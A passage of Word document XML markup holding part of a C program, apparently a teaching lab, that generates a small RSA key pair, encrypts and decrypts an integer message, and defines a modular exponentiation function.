    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>Key Gener</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>d =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>lti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>veIn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>erse(e,ph</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>,n);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1680" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>nPub</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>c Key PU =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>{%d,%d}",e,n);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>nPr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:t>R = {%d,%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:t>}",d,n);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220" w:right="6309"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>cryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>nMessage</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>= "); scanf("%d",</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>M);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>C =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>power(M,e,n);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">C = %d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n",C);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>Decryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>= power(C,d,n);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>nDecry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">essage M = %d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>n",M);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>urn 0;</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i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>power(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>x, uns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">gned </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">res = 1;    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>In</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ze resu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="2" w:line="540" w:lineRule="atLeast"/>
        <w:ind w:left="340" w:right="3601"/>
      </w:pPr>
      <w:r>
        <w:t>x =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">x % p; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Upda</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">x </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">f </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ore</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>han or equal</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o p </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e (y &gt; 0)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="580" w:right="5094"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">If y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s odd, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>lti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y x w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h resu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f (y &amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>1)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="820"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>res =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>(res*x) % p;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="580" w:right="6333"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ust</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be even</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>w y =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y&gt;&gt;1;   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>y =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>2 x =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(x*x) % p;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
